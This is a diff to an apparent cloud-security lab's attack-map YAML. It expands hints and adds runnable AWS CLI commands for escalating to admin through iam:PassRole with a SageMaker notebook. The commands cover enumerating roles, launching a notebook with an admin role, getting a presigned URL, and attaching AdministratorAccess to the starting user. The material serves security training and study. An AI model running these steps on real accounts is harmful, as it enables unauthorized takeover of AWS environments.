@@ -50,23 +50,36 @@ attackMap:
         role. The notebook inherits all permissions of that role once it reaches
         InService state.
       hints:
-        - "You can pass IAM roles to AWS services. Which ML services accept execution roles?"
-        - "SageMaker notebook instances run with the permissions of their execution role. What if that role is an admin?"
+        - "Start by understanding what permissions this user has -- look at the policies attached to the starting user."
+        - "You can pass IAM roles to AWS services. Look for roles in the account that trust sagemaker.amazonaws.com as a service principal."
+        - "Use iam:ListRoles to enumerate available roles, then iam:GetRole to inspect their trust policies and attached policies."
+        - "SageMaker notebook instances run with the permissions of their execution role -- what happens if that role has AdministratorAccess?"
+        - "To create a notebook instance you need the role ARN, an instance type (ml.t3.medium is sufficient), and a name for the instance."
+        - "After creating the instance, poll sagemaker:DescribeNotebookInstance until the status reaches InService -- this typically takes 5-8 minutes."
         - "Browse to https://pathfinding.cloud/paths/sagemaker-001 for technique details."
       commands:
+        - description: "List roles that trust SageMaker to find passable admin roles"
+          command: "aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument.Statement[].Principal.Service, `sagemaker.amazonaws.com`)].RoleName'"
+        - description: "Confirm the target role has AdministratorAccess"
+          command: "aws iam list-attached-role-policies --role-name pl-prod-sagemaker-001-to-admin-passable-role"
         - description: "Create SageMaker notebook instance with admin execution role"
           command: "aws sagemaker create-notebook-instance --notebook-instance-name pl-prod-sagemaker-001-to-admin-notebook --instance-type ml.t3.medium --role-arn arn:aws:iam::{account_id}:role/pl-prod-sagemaker-001-to-admin-passable-role"
-        - description: "Generate presigned URL for notebook access"
-          command: "aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name pl-prod-sagemaker-001-to-admin-notebook --query 'AuthorizedUrl' --output text"
+        - description: "Poll for InService status"
+          command: "aws sagemaker describe-notebook-instance --notebook-instance-name pl-prod-sagemaker-001-to-admin-notebook --query 'NotebookInstanceStatus' --output text"
 
     - from: notebook-instance
       to: target-role
-      label: "Executes as execution role"
+      label: "sagemaker:CreatePresignedNotebookInstanceUrl"
       description: >
-        The notebook instance automatically assumes the execution role. Any AWS CLI
-        commands run in the Jupyter terminal execute with the full permissions of the
-        admin role, completing the privilege escalation.
+        Generate a presigned URL to access the Jupyter environment, then open a terminal
+        in the notebook to execute AWS CLI commands as the admin execution role.
       hints:
-        - "The notebook terminal runs AWS CLI commands as the execution role."
-        - "Generate a presigned URL to access the Jupyter environment without console login."
-      commands: []
+        - "The notebook terminal runs AWS CLI commands as the execution role -- you need a way to get inside the Jupyter environment."
+        - "You can access the notebook directly through the AWS Console if you have console access, or generate a presigned URL that works without console login."
+        - "Use sagemaker:CreatePresignedNotebookInstanceUrl to generate a time-limited URL that logs you directly into the Jupyter interface."
+        - "Once inside Jupyter, open a terminal via New -> Terminal and run AWS CLI commands -- they execute as the admin execution role."
+      commands:
+        - description: "Generate presigned URL for notebook access"
+          command: "aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name pl-prod-sagemaker-001-to-admin-notebook --query 'AuthorizedUrl' --output text"
+        - description: "In the Jupyter terminal: grant admin policy to starting user"
+          command: "aws iam attach-user-policy --user-name pl-prod-sagemaker-001-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
